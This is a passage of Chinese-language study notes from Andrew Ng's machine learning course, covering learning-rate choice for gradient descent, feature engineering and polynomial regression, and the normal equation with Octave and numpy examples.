在接下来的视频中 我将介绍另一种技巧来使梯度下降 在实践中工作地更好</li></ul><h2 id="Gradient-Descent-in-Practice-II-Learning-Rate-梯度下降法实践2-学习率"><a href="#Gradient-Descent-in-Practice-II-Learning-Rate-梯度下降法实践2-学习率" class="headerlink" title="Gradient Descent in Practice II-Learning Rate(梯度下降法实践2-学习率)"></a>Gradient Descent in Practice II-Learning Rate(梯度下降法实践2-学习率)</h2><blockquote><p>在本段视频中 我想告诉大家 一些关于梯度下降算法的实用技巧 我将集中讨论 <code>学习率 α</code> 具体来说 这是梯度下降算法的 更新规则 这里我想要 告诉大家 如何调试 也就是我认为应该如何确定 梯度下降是正常工作的 此外我还想告诉大家 如何选择学习率 α 也就是我平常 如何选择这个参数 我通常是怎样确定 梯度下降正常工作的</p></blockquote><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104205201.png" alt></p><ul><li><strong>梯度下降算法所做的事情 就是为你找到 一个 θ 值 并希望它能够最小化代价函数 J(θ) *<em>我通常会在 梯度下降算法运行时 绘出代价函数 J(θ) 的值 这里的 <code>x 轴</code>是表示 *</em>梯度下降算法的 迭代步数</strong> 你可能会得到 这样一条曲线 注意 这里的 x 轴 是迭代步数 在我们以前看到的 J(θ) 曲线中 x 轴 也就是横轴 曾经用来表示参数 θ 但这里不是 具体来说 这一点的含义是这样的 当我运行完100步的梯度下降迭代之后 无论我得到 什么 θ 值 总之 100步迭代之后 我将得到 一个 θ 值 根据100步迭代之后 得到的这个 θ 值 我将算出 代价函数 J(θ) 的值 而这个点的垂直高度就代表 梯度下降算法 100步迭代之后 得到的 θ 算出的 J(θ) 值</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104205220.png" alt></p><ul><li>而这个点 则是梯度下降算法 迭代200次之后 得到的 θ 算出的 J(θ) 值 所以这条曲线 显示的是 梯度下降算法迭代过程中代价函数 J(θ) 的值 <strong>如果梯度下降算法 正常工作 那么每一步迭代之后 J(θ) 都应该下降</strong> 这条曲线 的一个用处在于 它可以告诉你 如果你看一下 我画的这条曲线 当你达到 300步迭代之后 也就是300步到400步迭代之间 就是曲线的这一段 看起来 J(θ) 并没有下降多少 所以当你 到达400步迭代时 这条曲线看起来已经很平坦了 也就是说 在这里400步迭代的时候 梯度下降算法 基本上已经收敛了 因为代价函数并没有继续下降 所以说 看这条曲线 可以帮助你判断 梯度下降算法是否已经收敛</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104205248.png" alt></p><ul><li>顺便说一下 对于每一个特定的问题 梯度下降算法所需的迭代次数 可以相差很大 也许对于某一个问题 梯度下降算法 只需要30步迭代就可以收敛 然而换一个问题 也许梯度下降算法就需要3000步迭代 对于另一个机器学习问题 则可能需要三百万步迭代 实际上 我们很难提前判断</li><li><strong>梯度下降算法 需要多少步迭代才能收敛</strong> 通常我们需要画出这类曲线 <strong>画出代价函数随迭代步数数增加的变化曲线</strong> 通常 我会通过看这种曲线 来试着判断 梯度下降算法是否已经收敛 另外 也可以 进行一些<strong>自动的收敛测试</strong> 也就是说用一种算法 来告诉你梯度下降算法 是否已经收敛 自动收敛测试 一个非常典型的例子是 如果代价函数 J(θ) 的下降小于 一个很小的值 ε 那么就认为已经收敛 比如可以选择 1e-3 但我发现 通常要选择一个合适的阈值 ε 是相当困难的 因此 为了检查 梯度下降算法是否收敛 我实际上还是 通过看 左边的这条曲线图 而不是依靠自动收敛测试</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104205302.png" alt></p><ul><li>此外 这种曲线图 也可以 在算法没有正常工作时 提前警告你 具体地说 如果代价函数 J(θ) 随迭代步数 的变化曲线是这个样子 J(θ) 实际上在不断上升 那就很明显的表示 梯度下降算法没有正常工作 而这样的曲线,通常意味着你应该使用<strong>较小的学习率a</strong></li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104205314.png" alt></p><ul><li>这样的曲线图表示你的学习率a太大了,因此得到的结果也会不断跳过最小值,变得越来越大,因此应该使用<strong>较小的学习率a</strong></li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104205324.png" alt></p><ul><li>这种图也是要选择<strong>小的a</strong></li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104205332.png" alt></p><ul><li>a不可以太大,也不可以太小</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104205430.png" alt></p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104205448.png" alt></p><ul><li>一般尝试的a值</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104205502.png" alt></p><h2 id="Features-and-Polynomial-Regression-特征和多项式回归"><a href="#Features-and-Polynomial-Regression-特征和多项式回归" class="headerlink" title="Features and Polynomial Regression 特征和多项式回归"></a>Features and Polynomial Regression 特征和多项式回归</h2><blockquote><p>你现在了解了多变量的线性回归 在本段视频中 我想告诉你 一些<strong>用来 选择特征的方法</strong>以及 <strong>如何得到不同的学习算法</strong> 当选择了合适的特征后 这些算法往往是非常有效的 另外 我也想 给你们讲一讲<code>多项式回归</code> 它使得你们能够<strong>使用 线性回归的方法来拟合 非常复杂的函数 甚至是非线性函数</strong></p></blockquote><ul><li>以预测房价为例 假设你有两个特征 分别是房子<code>临街的宽度</code>和<code>垂直宽度</code> 这就是我们想要卖出的房子的图片 临街宽度 被定义为这个距离 其实就是它的宽度 或者说是 你拥有的土地的宽度 如果这块地都是你的的话 而这所房子的 纵向深度就是 你的房子的深度 这是正面的宽度 这是深度 我们称之为临街宽度和纵深 你可能会 像这样 建立一个 线性回归模型 其中临街宽度 是你的第一个特征x1 纵深是你的第二个 特征x2</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104205534.png" alt></p><ul><li>但当我们在 运用线性回归时 你不一定非要直接用 给出的 x1 和 x2 作为特征 其实你<strong>可以自己创造新的特征</strong> 因此 如果我要预测 房子的价格 我真正要需做的 也许是 确定真正能够决定 我房子大小 或者说我土地大小 的因素是什么 因此 我可能会创造一个新的特征 我称之为 x 它是临街宽度与纵深的乘积 这是一个乘法符号 它是临街宽度与纵深的乘积 这得到的就是我拥有的土地的面积 然后 我可以把 假设选择为 使其只使用 一个特征 也就是我的 土地的面积 对吧？</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104205550.png" alt></p><ul><li>由于矩形面积的 计算方法是 矩形长和宽相乘 因此 这取决于 你从什么样的角度 去审视一个特定的问题 而不是 只是直接去使用临街宽度和纵深 这两个我们只是碰巧在开始时 使用的特征 有时 通过定义 新的特征 你确实会得到一个更好的模型</li><li>与选择特征的想法 密切相关的一个概念 被称为<code>多项式回归(polynomial regression)</code> 比方说 你有这样一个住房价格的数据集 为了拟合它 可能会有多个不同的模型供选择 其中一个你可以选择的是像这样的<code>二次模型</code> 因为直线似乎并不能很好地拟合这些数据 因此 也许你会想到 用这样的二次模型去拟合数据 你可能会考量 是关于价格的一个二次函数 也许这样做 会给你一个 像这样的拟合结果</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104205609.png" alt></p><ul><li>但是 然后你可能会觉得 二次函数的模型并不好用 因为 一个二次函数最终 会降回来 而我们并不认为 房子的价格在高到一定程度后 会下降回来</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104205635.png" alt></p><ul><li>因此 也许我们会 选择一个不同的多项式模型 并转而选择使用一个 <code>三次函数</code> 在这里 现在我们有了一个三次的式子 我们用它进行拟合 我们可能得到这样的模型 也许这条绿色的线 对这个数据集拟合得更好 因为它不会在最后下降回来</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104205715.png" alt></p><ul><li>那么 我们到底应该如何将模型与我们的数据进行拟合呢？ 使用<code>多元线性回归的方法</code> 我们可以 通过将我们的算法做一个非常简单的修改来实现它 按照我们以前假设的形式 我们知道如何对 这样的模型进行拟合 其中 <code>ħθ(x)</code> 等于 <code>θ0 +θ1×x1 + θ2×x2 + θ3×x3</code> 那么 如果我们想 拟合这个三次模型 就是我用绿色方框框起来的这个 现在我们讨论的是 为了预测一栋房子的价格 我们用 θ0 加 θ1 乘以房子的面积 加上 θ2 乘以房子面积的平方 因此 这个式子与那个式子是相等的 然后再加 θ3 乘以 房子面积的立方 为了将这两个定义 互相对应起来 为了做到这一点 我们自然想到了 将 x1 特征设为 房子的面积 将第二个特征 x2 设为 房屋面积的平方 将第三个特征 x3 设为 房子面积的立方</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104205728.png" alt></p><ul><li>那么 仅仅通过将 这三个特征这样设置 然后再应用线性回归的方法 我就可以拟合 这个模型 并最终 将一个三次函数拟合到我的数据上 我还想再说一件事 那就是 如果你像这样选择特征 那么<code>特征的归一化</code> 就变得更重要了 因此 如果 房子的大小范围在 <code>1到1000</code>之间 那么 比如说 从1到1000平方尺 那么 房子面积的平方 的范围就是 <code>一到一百万</code> 也就是 1000的平方 而你的第三个特征 x的立方 抱歉 你的第三个特征 x3 它是房子面积的 立方 范围会扩大到 1到<code>10的9次方</code> 因此 <strong>这三个特征的范围 有很大的不同 因此 如果你使用梯度下降法 应用<code>特征值的归一化</code>是非常重要的</strong> 这样才能将他们的 值的范围变得具有可比性</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104205743.png" alt></p><ul><li>最后 这里是最后一个例子 关于如何使你 真正选择出要使用的特征 此前我们谈到 一个像这样的二次模型 并不是理想的 因为 你知道 也许一个二次模型能很好地拟合 这个数据 但二次 函数最后会下降 这是我们不希望的 就是住房价格往下走 像预测的那样 出现房价的下降 但是 除了转而 建立一个三次模型以外 你也许有其他的选择 特征的方法 这里有很多可能的选项 但是给你另外一个 合理的选择的例子</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104205757.png" alt></p><ul><li>另一种合理的选择 可能是这样的 一套房子的价格是 <code>θ0 加 θ1 乘以 房子的面积 然后 加 θ2 乘以房子面积的平方根</code> 可以吧？</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104205805.png" alt></p><ul><li>平方根函数是 这样的一种函数 也许θ1 θ2 θ3 中会有一些值 会捕捉到这个模型 从而使得这个曲线看起来 是这样的 趋势是上升的 但慢慢变得 平缓一些 而且永远不会 下降回来</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104205813.png" alt></p><ul><li>因此 通过深入地研究 在这里我们研究了平方根 函数的形状 并且 更深入地了解了选择不同特征时数据的形状 有时可以得到更好的模型 在这段视频中 我们探讨了多项式回归 也就是 如何将一个 多项式 如一个二次函数 或一个三次函数拟合到你的数据上 除了这个方面 我们还讨论了 在使用特征时的选择性 例如 我们不使用 房屋的临街宽度和纵深 也许 你可以 把它们乘在一起 从而得到 房子的土地面积这个特征 实际上 这似乎有点 难以抉择 这里有这么多 不同的特征选择 我该如何决定使用什么特征呢</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104205823.png" alt></p><ul><li>在之后的课程中 我们将 探讨一些算法 它们能够 自动选择要使用什么特征 因此 你可以使用一个算法 观察给出的数据 并自动为你选择 到底应该选择 一个二次函数 或者一个三次函数 还是别的函数 但是 在我们 学到那种算法之前 现在我希望你知道 你需要选择 使用什么特征 并且通过设计不同的特征 你能够用更复杂的函数 去拟合你的数据 而不是只用 一条直线去拟合 特别是 你也可以使用多项式 函数 有时候 通过采取适当的角度来观察 特征就可以 得到一个更符合你的数据的模型</li></ul><h2 id="Normal-Equation-正规方程"><a href="#Normal-Equation-正规方程" class="headerlink" title="Normal Equation 正规方程"></a>Normal Equation 正规方程</h2><blockquote><p>在这段视频中 我们要讲 <code>正规方程 (Normal Equation)</code>对于某些线性回归问题 用<strong>正规方程法求解参数 θ 的最优值</strong>更好</p></blockquote><ul><li>具体而言 到目前为止 我们一直在使用的<code>线性回归</code>的算法 是梯度下降法 就是说 为了最小化代价函数 J(θ) 来最小化这个 我们使用的迭代算法 需要经过很多步  也就是说通过多次迭代来计算梯度下降 来收敛到<strong>全局最小值</strong></li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104205846.png" alt></p><ul><li>相反地  正规方程法提供了一种求 θ 的解析解法 所以与其使用迭代算法   我们<strong>可以直接一次性求解θ的最优值</strong> 所以说基本上 一步就可以得到优化值</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104205857.png" alt></p><ul><li>正规方程法有一些优点 也有一些缺点 但是在我们讲解这个 和何时使用标准方程之前  让我们先对这个算法有一个直观的理解</li><li>我们举一个例子来解释这个问题 我们假设 有一个非常简单的代价函数 <code>J(θ)</code> 它就是一个<code>实数 θ</code> 的函数  所以现在 假设 <strong>θ 只是一个标量</strong> 或者说 θ 只有一行 它是一个数字 不是向量 假设我们的<code>代价函数 J</code> 是这个实参数 θ 的二次函数 所以 J(θ) 看起来是这样的</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104205908.png" alt></p><ul><li>那么如何最小化一个二次函数呢? 对于那些了解一点微积分的同学来说 你可能知道 <code>最小化的一个函数</code>的方法是 <strong>对它求导 并且将导数置零</strong>  所以对 J 求关于 θ 的导数 我不打算推导那些公式 你把那个导数置零 这样你就可以求得  使得 J(θ) 最小的 θ 值 这是数据为实数的 一个比较简单的例子</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104205924.png" alt></p><ul><li>在这个问题中 我们感兴趣的是 <strong>θ不是一个实数的情况 它是一个<code>n+1维</code>的参数向量</strong>  并且 <code>代价函数 J</code> 是这个向量的函数  也就是 θ0 到 θm 的函数 一个代价函数看起来是这样 像右边的这个平方代价函数 我们如何最小化这个代价函数J? 实际上 微积分告诉我们一种方法  <strong>对每个参数 θ 求 J 的偏导数  然后把它们全部置零 如果你这样做 并且求出θ0 θ1 一直到θn的值</strong> 这样就能得到能够最小化代价函数 J 的 θ 值</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104205935.png" alt></p><ul><li><p>如果你真的做完微积分和求解参数 θ0 到 θn   你会发现这个偏微分最终可能很复杂  接下来我在视频中要做的 实际上不是遍历所有的偏微分 因为这样太久太费事 我只是想告诉你们 你们想要实现这个过程所需要知道内容  这样你就可以解出 偏导数为0时 θ的值  换个方式说 或者等价地 这个 θ 能够使得代价函数 J(θ) 最小化  我发现可能只有熟悉微积分的同学 比较容易理解我的话 所以 如果你不了解 或者不那么了解微积分 也不必担心 我会告诉你 要实现这个算法并且使其正常运行 你所需的必要知识</p></li><li><p>举个例子 我想运行这样一个例子 假如说我有 m=4 个训练样本 假如说我有 m=4 个训练样本</p></li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104205946.png" alt></p><ul><li>为了实现<code>正规方程法</code> 我要这样做 看我的训练集 在这里就是这四个训练样本 在这种情况下 我们假设 这四个训练样本就是我的所有数据 我所要做的是 <strong>在我的训练集中加上一列对应额外特征变量的x0 就是那个取值永远是1的</strong></li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104210007.png" alt></p><ul><li>接下来我要做的是 构建一个<code>矩阵 X</code> 这个矩阵<strong>基本包含了训练样本的所有特征变量</strong>  所以具体地说  这里有我所有的特征变量 我们要把这些数字 全部放到矩阵中 X 中 所以只是 每次复制一列的数据</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104210034.png" alt></p><ul><li>我要对 y 做类似的事情  我要对我们将要预测的值 构建一个向量 像这样的 并且称之为<code>向量 y</code></li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104210111.png" alt></p><ul><li>所以 <code>X 会是一个 m*(n+1) 维矩阵</code> <code>y 会是一个 m 维向量</code>  其中 <code>m</code> 是<code>训练样本数量</code> <code>n</code> 是<code>特征变量数</code> n+1 是因为我加的这个额外的特征变量 x0  最后 如果你用矩阵 X 和向量 y 来计算这个 最后   <code>θ</code> 等于 <code>X 转置乘以 X 的逆 乘以 X 转置 乘以 y</code>  这样就得到能够使得代价函数最小化的 θ  幻灯片上的内容比较多 我讲解了这样一个数据组的一个例子 让我把这个写成更加通用的形式  在之后的视频中 我会仔细介绍这个方程</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104210153.png" alt></p><ul><li>在一般情况下 假如我们有 m 个训练样本 x(1) y(1) 直到 x(m) y(m) n 个特征变量 所以每一个训练样本 xi 可能看起来像一个向量 像这样一个 n+1 维特征向量</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104210255.png" alt></p><ul><li>我要构建矩阵 X 的方法  也被称为<code>设计矩阵</code> 如下所示  每个训练样本给出一个这样的特征向量 也就是说 这样的 n+1 维向量 我构建我的设计矩阵 X 的方法 就是构建这样的矩阵 接下来我要做的是将 取第一个训练样本 也就是一个向量 取它的转置 它最后是这样 扁长的样子 让 x1 转置作为我设计矩阵的第一行 然后我要把我的 第二个训练样本 x2 进行转置 让它作为 X 的第二行  以此类推 直到最后一个训练样本 取它的转置作为矩阵 X 的最后一行  这样矩阵 X 就是一个 m*(n+1) 维矩阵</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104210323.png" alt></p><ul><li>举个具体的例子 假如我只有一个特征变量 就是说除了 x0 之外只有一个特征变量  而 x0 始终为1 所以如果我的特征向量 xi等于1 也就是x0 和某个实际的特征变量 比如说房屋大小 那么我的设计矩阵 X 会是这样 第一行 就是这个的转置  所以最后得到1 然后 x(1)1 对于第二行 我们得到1 然后 x(1)2  这样直到1 然后 x(1)m 这就会是一个 <code>m*2</code> 维矩阵</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104210426.png" alt></p><ul><li>所以 <strong>这就是如何构建矩阵X 和向量y</strong>  有时我可能会在上面画一个箭头  来表示这是一个向量 但很多时候 我就只写y 是一样的 向量y 是这样求得的 把所有标签 所有训练集中正确的房子价格  放在一起 得到一个 m 维向量 y</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104210443.png" alt></p><ul><li><strong>最后 构建完矩阵 X 和向量 y 我们就可以通过计算 X转置 乘以X的逆 乘以X转置 乘以y 来得到θ</strong></li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104210456.png" alt></p><ul><li>我现在就想确保你明白这个等式  并且知道如何实现它 所以具体来说 什么是 X 的转置乘以 X 的逆？ <strong>X的转置 乘以 X的逆 是 X转置 乘以X的逆矩阵</strong> 具体来说 如果你令A等于 X转置乘以X  X的转置是一个矩阵  阵 我们把这个矩阵称为 A 那么 X转置乘以X的逆 就是矩阵 A 的逆  也就是 <code>1/A</code> 这就是计算过程 先计算 X转置乘以X 然后计算它的逆</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104210506.png" alt></p><ul><li>我们还没有谈到Octave 我们将在之后的视频中谈到这个 但是在 Octave 编程语言  或者类似的 MATLAB 编程语言里  计算这个量的命令是基本相同的 X转置 乘以X的逆 乘以X转置 乘以y 的代码命令如下所示</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104210525.png" alt></p><ul><li>在 Octave 中 <code>X’</code> 表示 <code>X 转置</code>  这个用红色框起来的表达式 计算的是 X 转置乘以 X  <code>函数 pinv</code> 是用来计算<code>逆矩阵</code>的函数 所以这个计算 X转置 乘以X的逆  然后乘以X转置 再乘以y  这样就算完了这个式子</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104210536.png" alt></p><ul><li>我没有证明这个式子 尽管我并不打算这么做 但是数学上是可以证明的 这个式子会给出最优的 θ 值  就是说如果你令 θ 等于这个 就是说如果你令 θ 等于这个 这个 θ 值会最小化这个线性回归的代价函数 J(θ)</li><li>最后一点 在之前视频中我提到<code>特征变量归一化</code> 和<code>让特征变量在相似的范围内</code>的想法 将所有的值归一化在类似范围内 <strong>如果你使用正规方程法 那么就不需要归一化特征变量</strong> 实际上这是没问题的 如果某个特征变量 x1 在 0到1的区间  某个特征变量 x2 在0到1000的区间  某个特征变量x3 在0到10^-5的区间 然后如果使用正规方程法 这样就没有问题 不需要做特征变量归一化 <strong>但如果你使用梯度下降法  特征变量归一化就很重要</strong></li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104210549.png" alt></p><ul><li>最后 你何时应该使用梯度下降法 而何时应该使用正规方程法呢？ 这里列举了一些它们的优点和缺点 假如你有 m 个训练样本和 n 个特征变量 <strong>梯度下降法的缺点之一</strong>就是 你需要选择学习速率 α 这通常表示需要运行多次 尝试不同的学习速率 α 然后找到运行效果最好的那个 所以这是一种额外的工作和麻烦 <strong>梯度下降法的另一个缺点是</strong> 它需要更多次的迭代 因为一些细节 计算可能会更慢 我们一会儿会看到更多的东西</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104210615.png" alt></p><ul><li><p>至于正规方程 你不需要选择学习速率 α 所以就非常方便 也容易实现 你只要运行一下 通常这就够了 并且你也不需要迭代 所以不需要画出 $J(\theta)$ 的曲线  来检查收敛性或者采取所有的额外步骤 到目前为止 天平似乎倾向于正规方程法</p></li><li><p>这里列举一些正规方程法的缺点 和梯度下降法的优点 <strong>梯度下降法在有很多特征变量的情况下也能运行地相当好</strong>  所以即使你有上百万的特征变量 所以即使你有上百万的特征变量 你可以运行梯度下降法 并且通常很有效 它会正常的运行 相对地 正规方程法 为了求解参数θ 需要求解这一项  我们需要计算这项 <code>X转置乘以X的逆</code> 这个是一个 <code>n*n</code> 的矩阵 如果你有 n 个特征变量的话 因为如果你看一下 X转置乘以X 的维度 你可以发现他们的<code>积的维度</code>  X转置乘以X 是一个 <code>n*n</code> 的矩阵 其中 n是特征变量的数量  <strong>实现逆矩阵计算所需要的计算量  大致是矩阵维度的三次方 因此计算这个逆矩阵需要计算大致 n 的三次方</strong>  有时稍微比计算 n 的三次方快一些 但是对我们来说很接近 所以如果特征变量的数量 n 很大的话 那么计算这个量会很慢  实际上标准方程法会慢很多  因此<strong>如果 n 很大 我可能还是会使用梯度下降法 因为我们不想花费 n 的三次方的时间 但如果 n 比较小 那么标准方程法可能更好地求解参数 θ</strong></p></li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104210624.png" alt></p><ul><li><strong>那么怎么叫大或者小呢？</strong> 那么 如果 n 是上百的  计算百位数乘百位数的矩阵 对于现代计算机来说没有问题 如果 n 是上千的 我还是会使用正规方程法 千位数乘千位数的矩阵做逆变换 对于现代计算机来说实际上是非常快的 但如果 n 上万 那么我可能会开始犹豫 上万乘上万维的矩阵作逆变换 会开始有点慢 此时我可能开始倾向于 梯度下降法 但也不绝对 n 等于一万 你可以 逆变换一个一万乘一万的矩阵 但如果 n 远大于此 我可能就会使用梯度下降法了 所以如果 n 等于10^6 有一百万个特征变量 那么做百万乘百万的矩阵的逆变换 就会变得非常费时间 在这种情况下我一定会使用梯度下降法 所以很难给出一个确定的值 来决定何时该换成梯度下降法  但是 对我来说通常是 <strong>在一万左右 我会开始考虑换成梯度下降法</strong>  或者我们将在以后讨论到的其他算法</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104210638.png" alt></p><ul><li>总结一下 只要特征变量的数目并不大 正规方程是一个很好的 计算参数 θ 的替代方法 具体地说 只要特征变量数量小于一万  我通常使用正规方程法  而不使用梯度下降法 预告一下在之后的课程中我们要讲的  随着我们要讲的学习算法越来越复杂  例如 当我们讲到分类算法 像逻辑回归算法 我们会看到 实际上对于那些算法 并不能使用正规方程法 对于那些更复杂的学习算法 我们将不得不仍然使用梯度下降法  因此 梯度下降法是一个非常有用的算法 可以用在有大量特征变量的线性回归问题 或者我们以后在课程中 会讲到的一些其他的算法 因为 标准方程法不适合或者不能用在它们上   但对于这个特定的线性回归模型 正规方程法是一个 比梯度下降法更快的替代算法 所以 根据具体的问题 所以  以及你的特征变量的数量 这两算法都是值得学习的<h3 id="正规方程笔记"><a href="#正规方程笔记" class="headerlink" title="正规方程笔记"></a>正规方程笔记</h3></li></ul><p>到目前为止，我们都在使用梯度下降算法，但是对于某些线性回归问题，正规方程方法是更好的解决方案。如：</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104210651.png" alt></p><p>正规方程是通过求解下面的方程来找出使得代价函数最小的参数的：$\frac{\partial}{\partial{\theta_{j}}}J\left( {\theta_{j}} \right)=0$ 。<br> 假设我们的训练集特征矩阵为 $X$（包含了 ${{x}_{0}}=1$）并且我们的训练集结果为向量 $y$，则利用正规方程解出向量 $\theta ={{\left( {X^T}X \right)}^{-1}}{X^{T}}y$ 。<br>上标T代表矩阵转置，上标-1 代表矩阵的逆。设矩阵$A={X^{T}}X$，则：${{\left( {X^T}X \right)}^{-1}}={A^{-1}}$<br>以下表示数据为例：</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104210731.png" alt></p><p>即：</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104210742.png" alt></p><p>运用正规方程方法求解参数：</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104210754.png" alt></p><p>在 Octave 中，正规方程写作：</p><pre><code>pinv(X&#39;*X)*X&#39;*y</code></pre><p>注：对于那些不可逆的矩阵（通常是因为特征之间不独立，如同时包含英尺为单位的尺寸和米为单位的尺寸两个特征，也有可能是特征数量大于训练集的数量），正规方程方法是不能用的。</p><p>梯度下降与正规方程的比较：</p><table><thead><tr><th>梯度下降</th><th>正规方程</th></tr></thead><tbody><tr><td>需要选择学习率{% raw %}$\alpha${% endraw %}</td><td>不需要</td></tr><tr><td>需要多次迭代</td><td>一次运算得出</td></tr><tr><td>当特征数量{% raw %}$n${% endraw %}大时也能较好适用</td><td>需要计算{% raw %}${{\left( {{X}^{T}}X \right)}^{-1}}${% endraw %} 如果特征数量n较大则运算代价大，因为矩阵逆的计算时间复杂度为{% raw %}$O\left( {{n}^{3}} \right)${% endraw %}，通常来说当{% raw %}$n${% endraw %}小于10000 时还是可以接受的</td></tr><tr><td>适用于各种类型的模型</td><td>只适用于线性模型，不适合逻辑回归模型等其他模型</td></tr></tbody></table><p>总结一下，只要特征变量的数目并不大，标准方程是一个很好的计算参数{% raw %}$\theta ${% endraw %}的替代方法。具体地说，只要特征变量数量小于一万，我通常使用标准方程法，而不使用梯度下降法。</p><p>随着我们要讲的学习算法越来越复杂，例如，当我们讲到分类算法，像逻辑回归算法，我们会看到，<br>实际上对于那些算法，并不能使用标准方程法。对于那些更复杂的学习算法，我们将不得不仍然使用梯度下降法。因此，梯度下降法是一个非常有用的算法，可以用在有大量特征变量的线性回归问题。或者我们以后在课程中，会讲到的一些其他的算法，因为标准方程法不适合或者不能用在它们上。但对于这个特定的线性回归模型，标准方程法是一个比梯度下降法更快的替代算法。所以，根据具体的问题，以及你的特征变量的数量，这两种算法都是值得学习的。</p><p>正规方程的python实现：</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> numpy <span class="token keyword">as</span> np<span class="token keyword">def</span> <span class="token function">normalEqn</span><span class="token punctuation">(</span>X<span class="token punctuation">,</span> y<span class="token punctuation">)</span><span class="token punctuation">:</span>   theta <span class="token operator">=</span> np<span class="token punctuation">.</span>linalg<span class="token punctuation">.</span>inv<span class="token punctuation">(</span>X<span class="token punctuation">.</span>T@X<span class="token punctuation">)</span>@X<span class="token punctuation">.</span>T@y <span class="token comment" spellcheck="true">#X.T@X等价于X.T.dot(X)</span>   <span class="token keyword">return</span> theta</code></pre><h2 id="正规方程及不可逆性"><a href="#正规方程及不可逆性" class="headerlink" title="正规方程及不可逆性"></a>正规方程及不可逆性</h2><p>在这段视频中谈谈正规方程 ( normal equation )，以及它们的不可逆性。<br>由于这是一种较为深入的概念，并且总有人问我有关这方面的问题，因此，我想在这里来讨论它，由于概念较为深入，所以对这段可选材料大家放轻松吧，也许你可能会深入地探索下去，并且会觉得理解以后会非常有用。但即使你没有理解正规方程和线性回归的关系，也没有关系。</p><p>我们要讲的问题如下：$\theta ={{\left( {X^{T}}X \right)}^{-1}}{X^{T}}y$</p><p>有些同学曾经问过我，当计算 $\theta$=<code>inv(X&#39;X ) X&#39;y</code> ，那对于矩阵$X'X$的结果是不可逆的情况咋办呢?<br>如果你懂一点线性代数的知识，你或许会知道，有些矩阵可逆，而有些矩阵不可逆。我们称那些不可逆矩阵为<code>奇异</code>或<code>退化矩阵</code>。</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104210822.png" alt></p><p>问题的重点在于$X'X$的不可逆的问题很少发生，在Octave里，如果你用它来实现$\theta$的计算，你将会得到一个正常的解。在Octave里，有两个函数可以求解矩阵的逆，一个被称为<code>pinv()</code>，另一个是<code>inv()</code>，这两者之间的差异是些许计算过程上的，一个是所谓的<code>伪逆</code>，另一个被称为<code>逆</code>。使用<code>pinv()</code> 函数可以展现数学上的过程，这将计算出$\theta$的值，即便矩阵$X'X$是不可逆的。</p><p>在<code>pinv()</code> 和 <code>inv()</code> 之间，又有哪些具体区别呢 ?</p><p>其中<code>inv()</code> 引入了先进的数值计算的概念。</p><p>出现不可逆的一般有两个原因,第一个原因是:<strong>如果不知何故,再你的学习问题中,你有多余的功能</strong> 